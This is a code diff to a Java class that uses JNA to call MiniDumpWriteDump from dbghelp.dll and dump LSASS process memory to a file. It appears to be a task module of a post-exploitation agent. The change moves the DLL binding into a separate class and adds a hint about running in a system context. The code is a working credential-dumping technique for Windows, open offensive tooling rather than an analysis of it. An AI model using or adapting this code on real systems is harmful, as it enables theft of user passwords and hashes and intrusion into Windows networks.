@@ -25,11 +25,6 @@ import static com.sun.jna.platform.win32.WinUser.MAPVK_VSC_TO_VK_EX;
 
 public class windows {
 
-    static dbgApi32 winDbg = (dbgApi32) Native.loadLibrary("C:\\Windows\\System32\\dbghelp.dll",dbgApi32.class);
-    interface dbgApi32 extends StdCallLibrary {
-	    public boolean MiniDumpWriteDump(WinNT.HANDLE hProcess, long processID, WinNT.HANDLE hFile, long DumpType, long ExceptionParam, long UserStreamParam, long CallBackParam);
-    }
-
     
     public static Hashtable invokeMinidump(Hashtable args) {
         Hashtable taskOut = new Hashtable();
@@ -47,13 +42,13 @@ public class windows {
             boolean dmpResult = false; 
             
             try {
-                dmpResult = winDbg.MiniDumpWriteDump(hProc,pid,hFile,(long)2,(long)0,(long)0,(long)0);
+                dmpResult = Modlib.winDbg.MiniDumpWriteDump(hProc,pid,hFile,(long)2,(long)0,(long)0,(long)0);
             } catch(java.lang.Error possibleMemError) {
                 miniOut = "memory error - unable to dump LSASS memory";
             }
 
             if (dmpResult == false) {
-                miniOut = "unknown error - unable to dump LSASS memory";
+                miniOut = "unknown error - unable to dump LSASS memory (verify that you're running in a system context)";
             } else {
                 miniOut = String.format("LSASS memory dumped to %s",dmpOut);
             }
